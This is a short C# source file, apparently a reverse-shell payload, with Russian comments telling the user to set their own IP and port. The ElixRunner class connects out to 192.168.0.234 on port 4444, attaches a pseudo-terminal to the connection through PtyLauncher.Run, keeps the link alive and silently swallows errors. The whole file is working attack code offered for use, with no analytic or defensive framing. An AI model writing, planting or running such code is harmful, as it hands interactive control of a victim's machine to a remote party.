using System;
using System.Net.Sockets;
using System.Threading;

public class ElixRunner {
    public static void Start() {
        // Укажи свой IP и порт
        string host = "192.168.0.234"; 
        int port = 4444;

        try {
            using (TcpClient client = new TcpClient(host, port)) {
                // Запускаем терминал с размером 80x24
                PtyLauncher.Run(client.GetStream(), 80, 24);
                
                // Держим поток живым, пока есть соединение
                while (client.Connected) {
                    Thread.Sleep(1000);
                }
            }
        } catch { }
    }
}